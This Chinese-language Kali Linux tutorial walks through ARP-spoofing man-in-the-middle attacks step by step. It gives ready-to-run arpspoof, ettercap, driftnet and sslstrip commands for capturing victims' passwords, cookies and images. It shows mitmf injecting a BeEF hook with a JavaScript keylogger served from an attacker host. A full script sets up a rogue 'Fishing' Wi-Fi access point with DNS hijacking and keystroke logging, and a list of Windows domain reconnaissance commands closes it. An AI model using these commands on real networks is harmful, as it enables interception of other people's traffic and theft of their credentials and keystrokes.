# Kali 系统下 arp 嗅探

## 0x1 系统安装
1. 先安装一个kali系统，可以参考网上的教程。（网上的系统安装教程很多这里就不重复了）。系统下载推荐到官网下载。然后对比一下 校验码。

## 0x2 实践操作
**准备工作**

系统开启ip转发，使目标机器可以正常上网。如果未开启则目标主机在apr 投毒之后无法上网。

``` echo 1 > /proc/sys/net/ipv4/ip_forward；```

使用嗅探工具进行嗅探 比如（登录密码）,这里使用arpspoof 工具进行演示操作。具体使用方法可以使用 arpspoof -h 命令查看帮助文档

```
在终端中输入arpspoof -t 192.168.1.105 192.168.1.1 -i eth0
并输入ettercap -Tq -i eth0 进行账号密码嗅探；
```
arpspoof -t 192.168.1.105 192.168.1.1 -i eth0
命令解释：
 -t 目标ip  192.168.1.105  
  网关地址   192.168.1.1
 -i 使用eth0网口进行arp转发


**ettercap使用**

使用 ettercap嗅探。可以使用GUI视图窗口来进行操作，或者使用命令行下的命令来使用。这里介绍下 ettercap在GUI模式下的使用步骤

1. 使用 etteracp -G 开启程序主界面。
2. 开启ettercap，选择Sniff菜单里的Uniffied sniffing
3. 选择eth0网卡，wlan的话就选wlan0，然后点确定
4. 点击Hosts下的Scan for hosts
5. 点击Hosts下的Host list列出所有的ip，并把你想要攻击的ip选中（如果这里也是网关的话，会获得所有人的包），点击Add to Target1，选中网关ip，点击Add to Target2
6. 选择Mitm下的ARP poisoning
7. 选中 sniff remote connection 选项，点击确定
8. 选择start下的Start sniffing
 
如果目标主机进行了登录网站，比如登录路由器，或者邮箱帐号，会捕获到目标主机的登录名和密码信息，这里只是使用我自己的机器进行测试

## 0x3 图片获取

这里使用我们还可以使用driftnet截获受害者浏览的图片。driftnet -eth0 (系统使用的网卡名称)
在系统菜单中打开终端，输入 driftnet -i eth0 ，弹出driftnet，如果有图片的数据包流过，就会把图像显示出来 。

单击图片会保存到root更目录下，或者使用driftnet -i eth0 -a 命令显示图片名称，这样图片名称会在终端命令行中显示出来，并保存图片到目录中。当然你也可以修改图片保存目录。



## 0x4 cooick 获取
使用 Coocike Cadger工具进行

可以使用tcpdump或Wireshark工具截获所有流量。

## 会话劫持

**https登录账号密码嗅探**

vim /etc/ettercap.conf


\# if you use iptables:

   \#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"

   \#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"

修改为

\# if you use iptables:

   redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"

   redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
  

sslstrip -a -f -k

echo 1 >/proc/sys/net/ipv4/ip_forward

arpspoof -i wlan0 -t 192.168.100 192.168.1.1

ettercap -Tq -i wlan0 

**web浏量劫持**

工具：BEEF;mitmf;iptables

过程：

先把80端口的流量劫持走（这里10000是mitmf默认监听端口）

```
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```

然后打开mitmf

```
mitmf -i at0 --replace --search-str aaaaa  --replace-str bbbbb#把所有网页中的aaaaa替换成bbbbb
```
如果百度了aaaaa则会把aaa替换成bbb

好吧不要恶作剧了，上干货

```
mitmf -i at0 --inject --js-url http://10.0.0.1:3000/hook.js --jskeylogger
```
和beef的攻击测试脚本，其余的攻击方式（比如javapwn）可以参考http://www.freebuf.com/tools/45796.html

最后用BEEF测试用户浏览器吧！

```
/usr/share/beef-xss/beef
```

ssh 脚本

```
清空iptables
iptables -t nat -F
iptables -t nat -X  
iptables -t nat -P PREROUTING ACCEPT  
iptables -t nat -P POSTROUTING ACCEPT  
iptables -t nat -P OUTPUT ACCEPT  
iptables -t mangle -F  
iptables -t mangle -X  
iptables -t mangle -P PREROUTING ACCEPT  
iptables -t mangle -P INPUT ACCEPT  
iptables -t mangle -P FORWARD ACCEPT  
iptables -t mangle -P OUTPUT ACCEPT  
iptables -t mangle -P POSTROUTING ACCEPT  
iptables -F  
iptables -X  
iptables -P FORWARD ACCEPT  
iptables -P INPUT ACCEPT  
iptables -P OUTPUT ACCEPT  
iptables -t raw -F  
iptables -t raw -X  
iptables -t raw -P PREROUTING ACCEPT  
iptables -t raw -P OUTPUT ACCEPT  
#建立热点
airmon-ng stop mon0
ifconfig wlan1 down           #wlan1修改成你的网卡
iwconfig wlan1 mode monitor
ifconfig wlan1 up
airmon-ng start wlan1 &
sleep 2                  
gnome-terminal -x bash -c "airbase-ng -e Fishing -c 11 mon0"              #按需求修改
sleep 2
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
echo 1 > /proc/sys/net/ipv4/ip_forward
#配置dhcp
dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
sleep 2
/etc/init.d/isc-dhcp-server start 
#nat
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356
#劫持80
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
#劫持dns
gnome-terminal -x bash -c "dnschef -i 10.0.0.1 --nameserver 210.73.64.1#53"

#打开beef并进行80js键盘记录
gnome-terminal -x bash -c "mitmf -i at0 --inject --js-url http://10.0.0.1:3000/hook.js --jskeylogger"
beef-xss

```
## 内网信息获取

使用 Windows自带的命令进行内网信息的查看，这里只是初步查看内网的信息。
```
ipconfig /all
netstat –an
net start
net user
net user /domain
net group “domain admins”        #查看域管理员
net localgroup administrators
net view /domain
dsquery server         #查看域控服务器
dsquery subnet        #查看域IP范围
```

